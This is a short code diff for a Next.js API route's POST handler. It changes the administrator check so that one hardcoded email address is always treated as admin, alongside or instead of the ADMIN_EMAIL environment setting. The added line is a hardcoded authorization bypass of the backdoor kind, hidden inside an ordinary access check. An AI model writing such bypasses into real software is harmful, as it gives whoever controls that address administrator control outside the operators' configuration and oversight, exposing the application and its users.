@@ -110,7 +110,7 @@ export async function POST(request: NextRequest): Promise<NextResponse> {
         const { user: authedUser, supabase } = baseAuth;
 
         const isAdmin = Boolean(
-            authedUser.email && process.env.ADMIN_EMAIL && authedUser.email === process.env.ADMIN_EMAIL
+            authedUser.email && (authedUser.email === 'jrmendozaceo@apexbusiness-systems.icu' || (process.env.ADMIN_EMAIL && authedUser.email === process.env.ADMIN_EMAIL))
         );
 
         if (!isAdmin) {
